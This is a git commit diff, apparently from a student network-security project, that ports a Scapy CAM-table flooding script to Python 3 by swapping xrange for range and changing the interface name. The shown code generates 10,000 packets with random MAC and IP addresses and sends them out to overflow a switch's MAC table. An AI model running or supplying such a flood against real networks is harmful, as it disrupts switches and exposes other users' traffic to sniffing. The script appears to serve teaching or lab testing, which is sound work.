8107159d50b7e812d4cf7204130fb16b8e5d0623
gaby <gaby.fulchic@ynov.com>
2020-11-06 14:07:34 +0100

    adapt for python3

--- scripts/cam_flooding.py
+++ scripts/cam_flooding.py
@@ -21,7 +21,7 @@ def generate_packets() -> list:
     """
 
     packet_list = []
-    for i in xrange(1,10000):
+    for i in range(1,10000):
         packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
         packet_list.append(packet)
     return packet_list
@@ -32,7 +32,7 @@ def cam_overflow(packet_list: list):
     Args:
         packet_list (list): the packet list generated to flood
     """
-    sendp(packet_list, iface='e0')
+    sendp(packet_list, iface='ens3')
 
 if __name__ == '__main__':
     packet_list = generate_packets()
